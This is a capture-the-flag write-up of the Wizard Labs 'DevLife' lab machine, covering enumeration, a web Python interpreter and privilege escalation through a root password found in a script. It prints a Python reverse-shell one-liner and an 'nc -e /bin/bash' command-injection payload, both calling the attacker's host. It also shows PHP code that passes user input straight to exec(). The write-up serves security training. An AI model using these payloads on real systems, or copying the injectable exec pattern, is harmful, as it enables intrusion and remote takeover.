# Wizard Labs: DevLife

[ctf](/tags#ctf ) [wizard-labs](/tags#wizard-labs ) [wl-devlife](/tags#wl-
devlife ) [linux](/tags#linux ) [debian](/tags#debian ) [nmap](/tags#nmap )
[gobuster](/tags#gobuster ) [python](/tags#python )
[credentials](/tags#credentials ) [swp](/tags#swp ) [vim](/tags#vim )
[nano](/tags#nano )  
  
Apr 3, 2019

Wizard Labs: DevLife

![wl-DevLife-cover](https://0xdfimages.gitlab.io/img/wl-devlife-cover.png)

Another Wizard Lab’s host retired, DevLife. This was another really easy box,
that required some simple web enumeration to find a python panel that would
run python commands, and display the output. From there, I could get a shell
and the first flag. Then, more enumeration to find a python script in a hidden
directory that contained the root password. With that, I can escalate to root.
There was also a swp file in the hidden directory that I’ll attempt to recover
(and then figure out is actually nano), and I’ll look at how the php page runs
python commands, and show an injection in that.

## Box Details

Name: | wl-DevLife ![](../img/wl-logo.png)  
---|---  
OS: | Linux ![](../img/Linux.png)  
Difficulty: | 2/10  
Creator: | h4d3s  
  
## Recon

### nmap

`nmap` shows two port, ssh (22) and http (80):

    
    
    root@kali# nmap -sT -p- --min-rate 10000 -oA scans/alltcp 10.1.1.20
    Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-03 13:43 EDT
    Warning: 10.1.1.20 giving up on port because retransmission cap hit (10).
    Nmap scan report for 10.1.1.20
    Host is up (0.13s latency).
    Not shown: 58360 filtered ports, 7173 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    
    Nmap done: 1 IP address (1 host up) scanned in 102.08 seconds
    root@kali# nmap -sC -sV -p 22,80 -oA scans/nmap-scripts 10.1.1.20
    Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-03 13:47 EDT
    Nmap scan report for 10.1.1.20
    Host is up (0.13s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
    | ssh-hostkey:
    |   2048 b1:e0:36:a1:37:4b:31:1f:6d:ae:ce:18:d8:a3:0b:25 (RSA)
    |   256 6f:43:58:05:b6:1e:13:08:d3:de:9c:99:1d:a5:69:ca (ECDSA)
    |_  256 90:29:dc:74:0f:75:7d:ca:17:57:8e:c0:44:64:fb:37 (ED25519)
    80/tcp open  http    Apache httpd 2.4.25 ((Debian))
    |_http-server-header: Apache/2.4.25 (Debian)
    |_http-title: Site doesn't have a title (text/html).
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 24.17 seconds
    

### Website - TCP 80

#### Site

Site is a front page for a soon to come Django tutorial, with reference to a
online python interpreter:

![1554313764932](https://0xdfimages.gitlab.io/img/1554313764932.png)

#### gobuster

Running `gobuster` to look for additional paths finds two:

    
    
    root@kali# gobuster -u http://10.1.1.20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50
    
    =====================================================
    Gobuster v2.0.1              OJ Reeves (@TheColonial)
    =====================================================
    [+] Mode         : dir
    [+] Url/Domain   : http://10.1.1.20/
    [+] Threads      : 50
    [+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
    [+] Status codes : 200,204,301,302,307,403
    [+] Timeout      : 10s
    =====================================================
    2019/04/03 13:48:38 Starting gobuster
    =====================================================
    /manual (Status: 301)
    /dev (Status: 301)
    =====================================================
    2019/04/03 13:52:43 Finished
    =====================================================
    

#### /manual

`/manual` takes me to a listing of languages, which is a redirect to the
English version:

![1554314894527](https://0xdfimages.gitlab.io/img/1554314894527.png)

![1554314918783](https://0xdfimages.gitlab.io/img/1554314918783.png)

All the pages are different language Apache Docs.

#### /dev

`/dev` is more interesting:

![1554315040009](https://0xdfimages.gitlab.io/img/1554315040009.png)

On hitting “Submit Query”, I’m taken to
`http://10.1.1.20/dev/interpreter.php`. Interesting that the guy writing a
tutorial on Django is hosting this in php. ¯\\_(ツ)_/¯

If I submit with a command like `print 'A'*5`, I get:

![1554315226073](https://0xdfimages.gitlab.io/img/1554315226073.png)

So I have execution. I’ll also notice that `print "A"*5` doesn’t work. I can
guess that it has to do with how the php script is running the python, and `"`
might be already in use. I can confirm that by running `print \"A\"*5`, and
getting results. I’ll look at the code in Beyond Root.

## Shell As www-data

I can use the command execution in the webpage to get a shell. I’ll get a
reverse shell, update my IP and port, and then either change all the `"` to
`'` or to `\"` (both work). I’ll submit:

    
    
    import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.254.1.47\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);
    

And get a shell:

    
    
    root@kali# nc -lnvp 443
    Ncat: Version 7.70 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.1.1.20.
    Ncat: Connection from 10.1.1.20:56874.
    /bin/sh: 0: can't access tty; job control turned off
    $ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    

From there, I can grab `user.txt`:

    
    
    www-data@Devlife:/home/tedd$ cat user.txt 
    529c7a0e...
    

## Privesc: www-data –> root

In `/home/tedd` there’s not only `user.txt`, but an atypical hidden directory,
`.env`:

    
    
    www-data@Devlife:/home/tedd$ ls -la
    total 32
    dr-xr-xr-x 4 tedd tedd 4096 Dec 23 11:36 .
    drwxr-xr-x 3 root root 4096 Aug  6 06:40 ..
    -r-xr-xr-x 1 tedd tedd    0 Sep 17 16:49 .bash_history
    -r-xr-xr-x 1 tedd tedd  220 Aug  6 06:40 .bash_logout
    -r-xr-xr-x 1 tedd tedd 3526 Aug  6 06:40 .bashrc
    dr-xr-xr-x 2 root root 4096 Dec 23 11:42 .env
    dr-xr-xr-x 2 tedd tedd 4096 Aug 17 15:14 .nano
    -r-xr-xr-x 1 tedd tedd  675 Aug  6 06:40 .profile
    -r-xr-xr-x 1 root root   41 Sep 17 16:48 user.txt
    

Inside the dir, there’s a python script (and a swap file, that I’ll try to
recover in Beyond Root):

    
    
    www-data@Devlife:/home/tedd/.env$ ls -la
    total 16
    dr-xr-xr-x 2 root root 4096 Dec 23 16:11 .
    dr-xr-xr-x 4 tedd tedd 4096 Dec 23 11:36 ..
    -r-xr-xr-x 1 root root 1024 Dec 23 11:27 .sudo.py.swp
    -r-xr-xr-x 1 root root  150 Dec 23 11:43 su.py
    

Looking at the file, it seems to have the root password:

    
    
    www-data@Devlife:/home/tedd/.env$ cat su.py 
    
    import pexpect
    child = pexpect.spawn('su root')
    child.expect ('Password:')
    child.sendline('teddyxy2019')
    child.expect('\$')
    child.sendline('whoami')
    

Unfortunately, it doesn’t run, as the `pexpect` module isn’t installed for
`python` or `python3`:

    
    
    www-data@Devlife:/home/tedd/.env$ python ./su.py 
    Traceback (most recent call last):
      File "./su.py", line 2, in <module>
        import pexpect
    ImportError: No module named pexpect
    www-data@Devlife:/home/tedd/.env$ python3 ./su.py 
    Traceback (most recent call last):
      File "./su.py", line 2, in <module>
        import pexpect
    ImportError: No module named 'pexpect'
    

Still, I can just `su` myself and get a root shell:

    
    
    www-data@Devlife:/home/tedd/.env$ su 
    Password: 
    root@Devlife:/home/tedd/.env# id
    uid=0(root) gid=0(root) groups=0(root)
    

And from there, `root.txt`:

    
    
    root@Devlife:~# cat root.txt 
    d360adc7...
    

## Beyond Root

### sudo.py.swp

#### vi

In the directory next to `su.py` is a file called `.sudo.py.swp`. This looks
like a `vi` or `vim` recovery file. These files are written periodically as a
user workings in `vi` in case the program crashed. If there is a graceful
exit, the swap file is deleted.

I can show by example. I’ll open `/dev/shm/0xdf`, and then use Ctrl-z to
background `vi` and then kill the process. That will leave a swap file behind.
I can then open it with `vi -r 0xdf.txt` and get the file back.

I recorded a gif to demonstrate how it works. In the bottom window I have
`watch -d 'ls -la /dev/shm/'` running to see what’s happening on the file
system in the local directory as I work:

![](https://0xdfimages.gitlab.io/img/devlife-swap.gif)

Unfortunately, when I try to recover `sudo.py`, I get this message:

![1554322294875](https://0xdfimages.gitlab.io/img/1554322294875.png)

It looks like the swap file never flushed, so there’s nothing to recover.

#### nano

Update [4/4/19]: The box author contacted me to say that he never uses
`vi`/`vim`, but rather `nano`. That’s an entirely new thing to look that (that
I was previously unaware of).

If I try to open nano as www-data, it gives me an error because it can’t write
a .nano directory in my homedir, `/var/www`:

    
    
    www-data@Devlife:/home/tedd/.env$ nano
    Unable to create directory /var/www/.nano: Permission denied
    It is required for saving/loading search history or cursor positions.
    
    Press Enter to continue
    
    Error opening terminal: unknown.
    

But if I escalate to root, when I try to open `sudo.py`, a file that doesn’t
exist, I get a different message. First, it might complain about not knowing
my terminal. I can solve that by exporting TERM:

    
    
    root@Devlife:/home/tedd/.env# nano sudo.py
    Error opening terminal: unknown.
    root@Devlife:/home/tedd/.env# export TERM=screen
    

Now I can open that file, `nano sudo.py`. `nano` opens, but at the bottom is a
message:

![1554405746827](https://0xdfimages.gitlab.io/img/1554405746827.png)

If I hit yes, this file is updated with my pid, and then deleted on a clean
exit.

From [stack overflow](https://askubuntu.com/questions/730188/file-var-log-
syslog-is-being-edited-message-in-nano):

> If the option “vim-style lock-files” is enables (`set locking` in nanorc),
> which is the case by default, nano creates a special so called “lock file”
> while you edit a file to indicate that the file is currently edited.
>
> Normally this file is removed when nano is closed, but that doesn’t happen
> if you kill it by closing the terminal.

I’ll demonstrate on target with two terminals. The lower one is running `watch
-d 'ls -la`. In the top one, I’ll `nano 0xdf`, and the swp file is created.
Then I’ll exit, and it goes away. Then I’ll open it again, and this time, I’ll
kill the terminal window, stranding the process. I’ll see the swp file
remains, and it’s the same size as `.sudo.py.swp`. Then I’ll exit the watch
and try to open 0xdf, and see it’s already in use.

![](https://0xdfimages.gitlab.io/img/devlife-swap-nano.gif)

### interpreter.php

I had guessed earlier that the php was using `"` and that’s why I couldn’t do
`print "A"`. Once I got a shell, I decided to take a look at
`interpreter.php`:

    
    
    <html>                               
    <body>       
    <h1> Online Python 2.7 Interpreter </h1>                          
    <h1></h1>                                                         
    <form action="interpreter.php" method="post">
    Python Instruction <input type="text" name="com"><br>                     
    <input type="submit">                                                      
    </form>                                         
    
    <?php                                                                
    $command = '/usr/bin/python -c "%s" ' ;   
    $test =  $_POST["com"] ;                                                    
    $out = sprintf($command, $test) ;                             
    
    $hadi = exec($out);
    echo $hadi ;                                       
    ?>
    

So it is using my input to build a string, and then executing it with system.

So some examples of input:

Input | Result | Comment  
---|---|---  
`print 'a'` | `/usr/bin/python -c "print 'a'"` | Works  
`print "a"` | `/usr/bin/python -c "print "a""` | Doesn’t work. `"`s break.  
`print \"a\"` | `/usr/bin/python -c "print \"a\""` | Works  
  
That’s neat, but there’s also an injection opportunity here. I’ll enter:

    
    
    print 'A'"; nc -e /bin/bash 10.254.1.47 443; python -c "print 'B'
    

The script will create the string:

    
    
    /usr/bin/python -c "print 'A'"; nc -e /bin/bash 10.254.1.47 443; python -c "print 'B'"
    

That is just three commands:

    
    
    /usr/bin/python -c "print 'A'";
    nc -e /bin/bash 10.254.1.47 443;
    python -c "print 'B'"
    

In fact, it does return a shell:

    
    
    root@kali# nc -lnvp 443
    Ncat: Version 7.70 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.1.1.20.
    Ncat: Connection from 10.1.1.20:56886.
    id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    

[](/2019/04/03/wl-devlife.html)

